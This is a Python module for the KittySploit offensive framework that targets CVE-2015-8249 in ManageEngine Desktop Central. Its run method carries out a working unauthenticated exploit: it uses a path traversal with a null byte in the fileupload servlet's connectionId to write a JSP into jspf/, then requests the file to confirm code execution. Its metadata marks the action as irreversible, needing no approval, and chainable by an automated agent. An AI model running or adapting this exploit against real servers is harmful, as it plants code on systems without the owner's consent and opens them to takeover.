#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""ManageEngine Desktop Central FileUploadServlet path traversal (CVE-2015-8249)."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'ManageEngine Desktop Central - FileUploadServlet Detection (CVE-2015-8249)',
        'description': (
            'Detects CVE-2015-8249 by uploading a JSP via FileUploadServlet connectionId '
            'path traversal into jspf/ and verifying execution.'
        ),
        'author': ['KittySploit Team'],
        'severity': 'critical',
        'tags': [
            'web', 'scanner', 'cve', 'cve2015', 'manageengine', 'upload', 'rce', 'unauth', 'vuln',
        ],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 2,
            'reversible': False,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.5,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0, 'min_params': 0,
                'tech_hints_any': [], 'tech_hints_all': [],
                'specializations_any': [], 'risk_signals_any': [],
                'auth_session': False, 'capabilities_any': [], 'capabilities_all': [],
                'confidence_min': {}, 'confidence_min_any': {},
                'endpoint_pattern_any': [], 'param_any': [], 'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [{'capability': 'risk_signal', 'from_detail': ''}],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [],
            },
        },
        'references': [
            'https://nvd.nist.gov/vuln/detail/CVE-2015-8249',
        ],
        'cve': 'CVE-2015-8249',
    }

    def run(self):
        marker = 'KS' + self.random_text(10)
        fname = 'ks_cve_2015_8249_test.jsp'
        postdata = f'<%= new String("{marker}") %>'
        # AAAAAAA\..\..\..\..\..\jspf\file.jsp\0
        url = (
            '/fileupload?connectionId=AAAAAAA%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5cjspf%5c'
            + fname
            + '%00&resourceId=B&action=rds_file_upload&computerName=ks%2ephp&customerId=47474747'
        )
        for base in ('', '/DesktopCentral', '/desktopcentral'):
            r = self.http_request(
                method='POST',
                path=base + url,
                data=postdata,
                headers={'Content-Type': 'application/octet-stream'},
                allow_redirects=False,
            )
            if not r or r.status_code != 200:
                continue
            g = self.http_request(
                method='GET', path=f'{base}/jspf/{fname}', allow_redirects=False,
            )
            if g and marker in (g.text or ''):
                self.set_info(
                    severity='critical',
                    reason='ManageEngine Desktop Central upload (CVE-2015-8249)',
                    path=f'{base}/fileupload',
                )
                return True
        return False
